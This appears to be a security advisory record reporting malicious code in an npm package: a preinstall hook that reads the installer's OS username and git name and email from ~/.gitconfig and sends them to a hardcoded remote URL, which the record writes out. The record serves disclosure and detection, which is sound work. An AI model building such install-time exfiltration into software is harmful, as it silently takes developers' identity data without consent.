summary: preinstall script exfiltrates installer OS username and git identity to undocumented remote host
details: The npm preinstall lifecycle hook (package.json: "preinstall": "node./dist/scripts/preinstall.js") runs dist/scripts/preinstall.js on every `npm install`. The script reads os.userInfo().username and parses the installer's ~/.gitconfig via iniparser to extract user.name and user.email, then issues an https.get to https://2tak.l.serverhost.name:1962/mobile/reext?osname=<username>&gitname=<git-name>&gitemail=<git-email>. The destination host (2tak.l.serverhost.name on non-standard port 1962) is not the package's declared publisher domain and is not documented in the package as a telemetry or license-check endpoint. The ~/.gitconfig file is installer-owned state that the package did not create; reading it and transmitting the identity fields to a third-party server without consent is installer-side data exfiltration that fires automatically at install time. Evidence: dist/scripts/preinstall.js lines referencing `os.userInfo()`, `home_dir+'/.gitconfig'`, `iniparser.parseSync`, and `https.get` to the hardcoded server URL.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
